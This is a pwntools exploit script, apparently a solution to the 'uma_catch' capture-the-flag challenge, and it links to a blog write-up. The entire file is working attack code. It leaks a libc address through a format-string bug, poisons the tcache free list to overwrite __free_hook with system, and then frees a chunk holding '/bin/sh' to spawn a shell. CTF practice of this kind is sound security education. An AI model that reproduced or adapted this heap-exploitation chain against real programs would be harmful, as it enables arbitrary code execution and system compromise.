# https://blog.y2a.dev/articles/2022/05-04/uma_catch
from pwn import *

file = "./chall"
libc = ELF("./libc-2.27.so")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def catch(index: str, color: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "1")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)
    io.recvuntil("color?(bay|chestnut|gray)")
    io.sendlineafter("> ", color)

def naming(index: str, name: bytes):
    io.recvuntil("command?")
    io.sendlineafter("> ", "2")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)
    io.recvuntil("name?")
    io.sendlineafter("> ", name)

def show(index: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "3")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)

def release(index: str):
    io.recvuntil("command?")
    io.sendlineafter("> ", "5")
    io.recvuntil("index?")
    io.sendlineafter("> ", index)

# libc leak by FSB
catch("0", "bay")
naming("0", "%11$p")
show("0")

libc.address = int(io.recvline().strip(), 16) - 231 - libc.sym['__libc_start_main']
print(f'addr_libc: {libc.address:x}')


release("0") # tcache: bay -> NULL
# fd = __free_hook
naming("0", p64(libc.sym['__free_hook']))
#=> tcache: bay -> __free_hook -> NULL

# chestnut(addr) == bay(addr)
catch("1", "chestnut") # tcache: __free_hook -> NULL
naming("1", b"/bin/sh") # list[1]->name = "/bin/sh"

catch("2", "gray") # gray == __free_hook
naming("2", p64(libc.sym['system'])) #__free_hook -> system

release("1") # __free_hook(list[1]) == system("/bin/sh")

io.interactive()
